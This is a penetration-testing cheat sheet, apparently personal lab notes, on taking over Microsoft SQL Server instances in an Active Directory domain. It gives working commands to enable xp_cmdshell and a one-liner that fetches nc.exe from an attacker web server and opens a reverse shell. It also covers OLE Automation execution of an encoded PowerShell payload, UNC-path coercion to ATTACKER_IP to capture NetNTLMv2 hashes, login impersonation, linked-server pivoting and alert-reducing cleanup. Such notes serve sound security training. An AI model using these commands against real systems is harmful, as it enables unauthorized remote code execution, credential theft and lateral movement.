---
title: SQL Server Admin
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Requirements]
> Control over a user or service account with sysadmin privileges on a SQL server instance

1. Find users with sysadmin privileges (`SQLAdmin` rights) on an SQL server instance:

Using BloodHound node info:
```bash
1. Search for User@DOMAIN node
2. Go to Node Info
3. Check the SQL Admin Rights section
```

Using BloodHound custom query:
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

2. Enumerate MSSQL Instances and ports:
```powershell
PS C:\> cd .\PowerUpSQL\
PS C:\> Import-Module .\PowerUpSQL.ps1
PS C:\> Get-SQLInstanceDomain
```

> [!Note]
> Check the PowerUpSQL  [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

3. Authenticate against the remote SQL server and run OS commands:

From a Windows Host:
```powershell
PS C:\>  Get-SQLQuery -Verbose -Instance "SQL_SERVER_IP,1433" -username "inlanefreight\SQL_ADMIN_USER" -password "SQL_ADMIN_PASSWORD" -query 'Select @@version'
```

From a Linux Host:
```shell
$ mssqlclient.py INLANEFREIGHT/SQL_ADMIN_USER@SQL_SERVER_IP -windows-auth

$ impacket-mssqlclient INLANEFREIGHT/SQL_ADMIN_USER@SQL_SERVER_IP -windows-auth
```

OS Command Execution:
```sql
-- Try:
SQL> enable_xp_cmdshell (execute OS commands via the DB)


-- If not, run:
SQL> EXECUTE sp_configure 'show advanced options', 1; -- enable advance options
SQL> RECONFIGURE; -- apply changes
SQL> EXECUTE sp_configure 'xp_cmdshell', 1; -- enable cmdshell
SQL> RECONFIGURE; -- apply changes


-- and then run:
SQL> EXECUTE xp_cmdshell 'whoami';

-- or from a windows host:

C:\> xp_cmdshell whoami /priv (enumerate our privileges on the system)
```

Upgrade to a reverse shell by referring to this page [[Shells]] or use this one liner for injecting the commands if we dont have valid credentials but we have identified an SQLi vulnerability in the MSSQL server:
```sql
EXECUTE xp_cmdshell "powershell.exe wget http://LOCAL_HOST:LOCAL_WEB_PORT/nc.exe -OutFile c:\\Users\Public\\nc.exe;"; EXECUTE xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe LOCAL_HOST LOCAL_LISTENER_PORT" --
```

## OS command execution without xp_cmdshell (OLE Automation)

If `xp_cmdshell` is disabled and cannot be re-enabled (policy-hardened), OLE Automation Procedures are a common fallback:
```sql
SQL> sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
SQL> DECLARE @o INT;
     EXEC sp_oacreate 'wscript.shell', @o OUT;
     EXEC sp_oamethod @o, 'run', NULL, 'cmd /c powershell -e <BASE64_PAYLOAD>';
```

> [!Note]
> Another route: `xp_dirtree`/`xp_fileexist` against a UNC path (`\\ATTACKER_IP\share`) forces the SQL service account to authenticate to us, letting us capture/relay its NetNTLMv2 hash — see [[NetNTLMv2]] and [[SMB Relay Attack]].

## MSSQL links and impersonation (privilege escalation inside SQL)

```sql
-- Impersonate a higher-priv login if we hold IMPERSONATE rights
SQL> EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;

-- Enumerate and pivot across linked servers (may run as sysadmin on the remote instance)
SQL> SELECT srvname, isremote FROM master..sysservers;
SQL> EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami'';') AT [LINKED_SERVER];
```

> [!Warning]
> Cleanup / OPSEC: after finishing, disable what you enabled so you don't leave the instance in a weakened state and generate fewer alerts:
> ```sql
> SQL> EXECUTE sp_configure 'xp_cmdshell', 0; RECONFIGURE;
> SQL> EXECUTE sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
> SQL> EXECUTE sp_configure 'show advanced options', 0; RECONFIGURE;
> ```

---

### Related notes
- [[MSSQL]] — service-level enumeration and access (port 1433)
- [[Impacket]] — `mssqlclient.py` / lateral movement to the host
- [[NetNTLMv2]] / [[SMB Relay Attack]] — coercing and relaying the SQL service account
- [[Kerberoasting]] — MSSQL service accounts frequently have SPNs and are roastable
- [[Shells]] — upgrading `xp_cmdshell` execution to an interactive shell